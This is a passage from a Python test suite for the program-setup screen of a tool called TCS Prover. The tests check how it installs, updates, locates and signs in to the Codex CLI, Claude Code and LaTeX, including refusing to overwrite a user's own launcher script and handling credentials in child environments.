        self.wait(waiting["id"])

    def test_no_sign_in_follows_when_it_was_not_ticked_or_is_not_needed(self):
        code, answer = self.act("claude", "install", signInAfter=False)
        done = self.wait(answer["task"]["id"])
        self.assertEqual(done["nextTask"], "")
        shutil.rmtree(self.home / ".local")
        (providers.state_directory() / providers.PROGRAM_FOLDERS).unlink()
        self.status()
        self.steer(claude_login="max")  # Already signed in after the install: nothing to start.
        code, answer = self.act("claude", "install", signInAfter=True, signInOption="subscription")
        done = self.wait(answer["task"]["id"])
        self.assertEqual(done["nextTask"], "")


class UseFolderTests(HttpCase):
    def test_a_copy_jobs_cannot_find_is_used_after_one_click(self):
        self.official_claude(on_path=False)
        claude = self.program(self.status(), "claude")
        self.assertEqual((claude["state"], claude["offPath"]), ("offpath", str(self.home / ".local" / "bin")))
        self.assertIn("Click Use it for jobs and TCS Prover will remember this folder. To use it in a terminal, add "
                      "~/.local/bin to your PATH.", claude["notes"])
        with self.assertRaises(runtime.CLIUnavailable):
            claude_cli.executable(runtime)
        code, answer = self.call("/setup/action", {"program": "claude", "action": "use-folder", "command": "/etc"})
        self.assertEqual(code, 409)
        code, answer = self.act("claude", "use-folder")
        self.assertEqual(code, 200, answer)
        self.assertEqual(self.program(answer["status"], "claude")["state"], "works")
        self.assertEqual(claude_cli.executable(runtime), str(self.home / ".local" / "bin" / "claude"))
        self.assertEqual(self.calls("installer"), [])


# 19. What needs each program ------------------------------------------------------------------------------------

class NeedsTests(HttpCase):
    def app(self, phase, stages=None, **models):
        app = server.App(runs=self.root / "runs", load_latest=False)
        app._new_run(f"Statement in phase {phase}.")
        app.state.update(runId=app.run_dir.name, phase=phase, draft=f"Statement in phase {phase}.",
                         workflowStages=stages or {"review": True, "author": True, "critic": True, "writing": True},
                         reviewModel="gpt-6.1-sol", authorModel="gpt-6.1-sol", criticModel="claude-opus-5-5",
                         writerModel="gpt-6.1-sol", **models)
        with self.http.jobs_lock:
            self.http.jobs[app.state["runId"]] = app
        return app

    def test_defaults_jobs_and_connections(self):
        status = self.status()
        self.assertEqual(status["defaults"]["source"], "built-in")
        self.assertEqual([(row["role"], row["on"], row["model"], row["program"], row["signIn"])
                          for row in status["defaults"]["roles"]],
                         [(role, True, "gpt-6.1-sol", "codex", True) for role in ("review", "author", "critic", "writer")])
        self.app("prepared", launchQueued=True)
        self.app("done")
        self.app("input")
        self.app("input", manuallyStopped=True)  # A statement review you stopped can still run.
        self.app("paused", stages={"review": False, "author": True, "critic": True, "writing": False})
        jobs = self.status("cached=1")["jobs"]
        self.assertEqual((jobs["codex"]["count"], jobs["codex"]["running"], jobs["codex"]["signIn"]), (3, 0, 3))
        self.assertEqual(jobs["claude"]["count"], 3)
        self.assertEqual(jobs["latex"]["count"], 2)  # Writing is off in the paused one.
        self.assertEqual({item["status"] for item in jobs["codex"]["items"]}, {"queued", "stopped", "paused"})
        self.assertNotIn("done", {item["status"] for item in jobs["codex"]["items"]})

    def test_saved_default_settings_are_what_new_problems_need(self):
        from ui import presets
        presets.save("Claude critic", {**presets.builtin_settings(), "criticModel": "claude-opus-5-5",
                                       "workflowStages": {"review": True, "author": True, "critic": True,
                                                          "writing": False}}, make_default=True)
        defaults = self.status()["defaults"]
        self.assertEqual((defaults["source"], defaults["name"]), ("saved", "Claude critic"))
        rows = {row["role"]: row for row in defaults["roles"]}
        self.assertEqual((rows["critic"]["program"], rows["critic"]["modelLabel"]), ("claude", "Claude Opus 5.5"))
        self.assertFalse(rows["writer"]["on"])


# 10. A program that changed since its last check, and your own file where OpenAI's installer writes -----------

USER_SCRIPT = "#!/bin/sh\n# your own codex launcher\nexec /somewhere/codex \"$@\"\n"


class StaleProgramTests(HttpCase):
    def own_script(self, executable=True):
        script = self.home / ".local" / "bin" / "codex"
        script.parent.mkdir(parents=True, exist_ok=True)
        if script.is_symlink() or script.exists():
            script.unlink()
        script.write_text(USER_SCRIPT)
        script.chmod(0o755 if executable else 0o644)
        return script

    def installer_command(self):
        return shlex.join(["/bin/bash", "-o", "pipefail", "-c", program_setup.INSTALLERS[("codex", "posix")]])

    def test_install_never_runs_over_a_script_that_appeared_after_the_check(self):
        codex = self.program(self.status(), "codex")
        self.assertEqual(codex["state"], "missing")
        command = codex["actions"]["install"]["dialog"]["command"]
        # While the dialog is open, your own launcher appears where OpenAI's installer writes (not on PATH).
        script = self.own_script()
        code, answer = self.call("/setup/action", {"program": "codex", "action": "install", "command": command})
        self.assertEqual((code, answer["error"]), (409, program_setup.STALE_TEXT))
        codex = self.program(answer["status"], "codex")
        self.assertEqual(codex["state"], "offpath")
        self.assertFalse(codex["actions"]["install"]["shown"])
        self.assertIn("The installer would replace it", " ".join(codex["notes"]))
        self.assertEqual(self.calls("installer"), [])
        self.assertFalse(script.is_symlink())
        self.assertEqual(script.read_text(), USER_SCRIPT)

    def test_update_never_runs_over_a_script_that_replaced_the_official_link(self):
        link = self.official_codex()
        codex = self.program(self.status(), "codex")
        self.assertTrue(codex["actions"]["update"]["available"])
        command = codex["actions"]["update"]["dialog"]["command"]
        # Meanwhile you replace the installer's link with your own wrapper.
        binary = self.codex_home / "packages" / "standalone" / "current" / "bin" / "codex"
        link.unlink()
        wrapper = f'#!/bin/sh\nexec {shlex.quote(str(binary))} "$@"\n'
        link.write_text(wrapper)
        link.chmod(0o755)
        code, answer = self.call("/setup/action", {"program": "codex", "action": "update", "command": command})
        self.assertEqual((code, answer["error"]), (409, program_setup.STALE_TEXT))
        codex = self.program(answer["status"], "codex")
        self.assertEqual((codex["state"], codex["kind"]), ("works", "script"))
        self.assertFalse(codex["actions"]["update"]["shown"])
        self.assertEqual(self.calls("installer"), [])
        self.assertFalse(link.is_symlink())
        self.assertEqual(link.read_text(), wrapper)

    def test_update_is_never_offered_over_your_own_script_where_the_installer_writes(self):
        # Jobs use OpenAI's own install, but ~/.local/bin/codex, which its installer replaces, is your own script.
        folder = self.codex_home / "packages" / "standalone" / "current" / "bin"
        folder.mkdir(parents=True)
        (self.bin / "codex").symlink_to(self.place("codex", folder))
        script = self.own_script()
        codex = self.program(self.status(), "codex")
        self.assertEqual((codex["state"], codex["kind"]), ("works", "installer"))
        self.assertFalse(codex["actions"]["update"]["shown"] or codex["actions"]["install"]["shown"])
        self.assertIn("~/.local/bin/codex is your own script, not the link OpenAI's installer makes there. The "
                      "installer would replace it", " ".join(codex["notes"]))
        code, answer = self.call("/setup/action", {"program": "codex", "action": "update",
                                                   "command": self.installer_command()})
        self.assertEqual((code, answer["error"]), (409, program_setup.STALE_TEXT))
        self.assertEqual(self.calls("installer"), [])
        self.assertEqual(script.read_text(), USER_SCRIPT)

    def test_install_is_never_offered_over_your_own_file_where_the_installer_writes(self):
        script = self.own_script(executable=False)  # No command jobs can use, and no other copy: missing.
        codex = self.program(self.status(), "codex")
        self.assertEqual(codex["state"], "missing")
        self.assertFalse(codex["actions"]["install"]["shown"])
        self.assertIn("The installer would replace it", " ".join(codex["notes"]))
        code, answer = self.call("/setup/action", {"program": "codex", "action": "install",
                                                   "command": self.installer_command()})
        self.assertEqual((code, answer["error"]), (409, program_setup.STALE_TEXT))
        self.assertEqual(self.calls("installer"), [])
        self.assertEqual(script.read_text(), USER_SCRIPT)

    def test_a_sign_in_for_a_program_that_moved_starts_nothing(self):
        self.place("codex")
        self.steer(codex_login="none")
        sign_in = self.program(self.status(), "codex")["actions"]["signIn"]
        command = next(row["command"] for row in sign_in["dialog"]["options"] if row["id"] == "browser")
        # Jobs now find another copy.
        (self.bin / "codex").unlink()
        other = self.place("codex", self.root / "other")
        os.environ["PATH"] = f"{self.bin}:{other.parent}:/usr/bin:/bin"
        code, answer = self.call("/setup/action", {"program": "codex", "action": "sign-in", "option": "browser",
                                                   "command": command})
        self.assertEqual((code, answer["error"]), (409, program_setup.STALE_TEXT))
        self.assertEqual(self.program(answer["status"], "codex")["path"], str(other))
        self.assertNotIn(["app-server"], [row["argv"] for row in self.calls("codex")])


class LockTests(HttpCase):
    def test_stop_and_a_steps_output_never_wait_for_a_check(self):
        # Claude Code installs (until stopped); the Codex CLI is off the path and slow to answer --version.
        self.steer(sleep=1, codex_version_sleep=6)
        self.place("codex", self.home / ".local" / "bin")
        status = self.status()
        self.assertEqual(self.program(status, "codex")["state"], "offpath")
        code, answer = self.act("claude", "install")
        self.assertEqual(code, 200, answer)
        install = answer["task"]["id"]
        self.wait_for(self.state / "installer-pid")
        folder = self.program(status, "codex")["actions"]["useFolder"]["folder"]
        results = {}
        thread = threading.Thread(target=lambda: results.update(use=self.call(
            "/setup/action", {"program": "codex", "action": "use-folder", "command": folder})))
        thread.start()
        # Use it for jobs now checks the Codex CLI where jobs find it (6 seconds).
        deadline = time.monotonic() + 10
        while ["--version"] not in [row["argv"] for row in self.calls("codex")] and time.monotonic() < deadline:
            time.sleep(0.05)
        started = time.monotonic()
        self.task(install)
        code, stopping = self.call("/setup/stop", {"id": install})
        self.assertLess(time.monotonic() - started, 2)
        self.assertEqual((code, stopping["task"]["stopping"]), (200, True))
        thread.join(30)
        self.assertEqual(results["use"][0], 200)
        self.assertEqual(self.program(results["use"][1]["status"], "codex")["state"], "works")
        self.wait(install)


class StatusReadTests(HttpCase):
    def test_a_background_read_never_starts_a_process(self):
        self.place("codex")
        self.place("claude")
        self.latex()
        # A tab left open across a restart reads this every minute: nothing is checked for it.
        body = self.status("cached=1")
        self.assertEqual(body["checkedAt"], "")
        self.assertEqual({program: info["state"] for program, info in body["programs"].items()},
                         {"codex": "checking", "claude": "checking", "latex": "checking"})
        self.assertEqual(self.calls(), [])
        # A page that opens checks when there is no check younger than ten minutes, and reuses one that is.
        self.assertEqual(self.program(self.status(""), "codex")["state"], "works")
        count = len(self.calls())
        self.assertGreater(count, 0)
        self.status("")
        self.assertEqual(len(self.calls()), count)
        # An hour later Codex is gone: a background read keeps the last check and starts nothing...
        self.http.setup.checked = time.monotonic() - 3600
        (self.bin / "codex").unlink()
        self.assertEqual(self.program(self.status("cached=1"), "codex")["state"], "works")
        self.assertEqual(len(self.calls()), count)
        # ...and a page that opens checks again.
        self.assertEqual(self.program(self.status(""), "codex")["state"], "missing")
        self.assertGreater(len(self.calls()), count)


class JobStatusWordsTests(unittest.TestCase):
    def test_a_jobs_alert_keeps_the_capitals_of_names(self):
        class Job:
            def __init__(self, title):
                self.title = title

            def attention(self, state):
                return {"title": self.title}

        titles = {"API key rejected": "API key rejected", "Codex login needed": "Codex login needed",
                  "Claude login needed": "Claude login needed",
                  "Claude Code not installed or not working": "Claude Code not installed or not working",
                  "Codex CLI not installed or not working": "Codex CLI not installed or not working",
                  "Usage limit reached": "usage limit reached", "Model not configured": "model not configured",
                  "Saved conversation ID missing": "saved conversation ID missing"}
        words = {title: server.Server._setup_job_status(None, Job(title), {"phase": "paused"}, False)
                 for title in titles}
        self.assertEqual(words, titles)
        self.assertEqual(server.Server._setup_job_status(None, Job("x"), {}, True), "running now")


# The runner's lookups and the remembered folder -------------------------------------------------------------------

class LookupTests(SetupCase):
    def remember(self, name, folder):
        providers.save_program_folder(name, folder)

    def test_the_remembered_folder_is_used_only_when_path_has_no_copy(self):
        folder = self.root / "installed"
        installed = self.place("codex", folder)
        with self.assertRaises(runtime.CLIUnavailable):
            runtime.codex()
        self.remember("codex", folder)
        self.assertEqual(runtime.codex(), str(installed))
        self.assertIn(str(installed), runtime._codex_candidates())
        on_path = self.place("codex")
        self.assertEqual(runtime.codex(), str(on_path))
        self.place("claude", folder)
        self.remember("claude", folder)
        self.assertEqual(claude_cli.executable(runtime), str(folder / "claude"))

    def test_a_linked_damaged_newer_or_relative_record_is_ignored(self):
        folder = self.root / "installed"
        self.place("codex", folder)
        path = providers.state_directory() / providers.PROGRAM_FOLDERS
        providers.private_directory(path.parent)
        for content in ("not json", json.dumps({"version": 2, "folders": {"codex": str(folder)}}),
                        json.dumps({"version": 1, "folders": {"codex": "relative/folder"}}),
                        json.dumps({"version": 1, "folders": {"codex": str(self.root / "missing")}}),
                        json.dumps({"version": 1, "folders": {"codex": 7}})):
            with self.subTest(content=content):
                path.write_text(content)
                self.assertIsNone(providers.program_folder("codex"))
                self.assertIsNone(providers.remembered_program("codex"))
        if POSIX:
            target = self.root / "elsewhere.json"
            target.write_text(json.dumps({"version": 1, "folders": {"codex": str(folder)}}))
            path.unlink()
            path.symlink_to(target)
            self.assertIsNone(providers.program_folder("codex"))
            path.unlink()
            path.write_text("{}")
            os.chmod(path, 0)
            self.assertIsNone(providers.program_folder("codex"))
            os.chmod(path, 0o600)

    def test_which_is_asked_about_a_folder_only_when_one_is_remembered(self):
        with mock.patch.object(shutil, "which", return_value=None) as which:
            self.assertIsNone(providers.remembered_program("codex"))
        which.assert_not_called()
        self.remember("codex", self.root)
        with mock.patch.object(shutil, "which", return_value=None) as which:
            providers.remembered_program("codex")
        which.assert_called_once_with("codex", path=str(self.root))

    def test_the_file_is_private_and_keeps_the_other_program(self):
        self.remember("codex", self.root / "bin")
        self.remember("claude", self.home)
        path = providers.state_directory() / providers.PROGRAM_FOLDERS
        self.assertEqual(json.loads(path.read_text())["folders"], {"codex": str(self.bin), "claude": str(self.home)})
        self.assertIn(Path(os.path.realpath(path)), providers.private_paths())
        with self.assertRaises(providers.ProviderError):
            providers.save_program_folder("latexmk", self.home)

    @unittest.skipUnless(sys.platform == "darwin", "the macOS native-binary check")
    def test_web_cutoff_runs_find_a_native_codex_in_the_remembered_folder(self):
        folder = self.root / "native"
        folder.mkdir()
        binary = folder / "codex"
        binary.write_bytes(b"\xcf\xfa\xed\xfe" + b"\0" * 64)  # A Mach-O header: the native-binary check passes.
        binary.chmod(0o755)
        workspace = self.root / "runs" / "job"
        workspace.mkdir()
        policy = {"isolation": {"workspace": str(workspace), "adapter": retrieval_runtime.MACOS_ADAPTER}}
        with mock.patch.object(Path, "home", return_value=self.home):
            with self.assertRaises(retrieval_runtime.IsolationCheckUnavailable):
                retrieval_runtime.codex_executable(policy)
            self.remember("codex", folder)
            self.assertEqual(retrieval_runtime.codex_executable(policy), str(binary))


class EnvironmentShapeTests(unittest.TestCase):
    def test_the_subscription_environment_is_the_job_environment_without_the_run_settings(self):
        base = {"PATH": "/usr/bin", "HOME": "/h", "ANTHROPIC_API_KEY": "k", "ANTHROPIC_BASE_URL": "u",
                "CLAUDE_CONFIG_DIR": "/c", "CLAUDE_CODE_OAUTH_TOKEN": "t", "CLAUDE_CODE_OAUTH_REFRESH_TOKEN": "r",
                "CLAUDE_CODE_USE_BEDROCK": "1", "SSH_AUTH_SOCK": "/s", "OTHER": "o"}
        job = claude_cli.child_environment(base, "max", api=False)
        run_only = {"CLAUDE_CODE_EFFORT_LEVEL", "CLAUDE_CODE_SUBPROCESS_ENV_SCRUB", "CLAUDE_CODE_RETRY_WATCHDOG"}
        self.assertEqual(claude_cli.subscription_environment(base),
                         {name: value for name, value in job.items() if name not in run_only})
        self.assertEqual(claude_cli.subscription_environment(base), {
            "PATH": "/usr/bin", "HOME": "/h", "CLAUDE_CONFIG_DIR": "/c", "CLAUDE_CODE_OAUTH_TOKEN": "t", "OTHER": "o",
            "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1"})


if __name__ == "__main__":
    unittest.main()
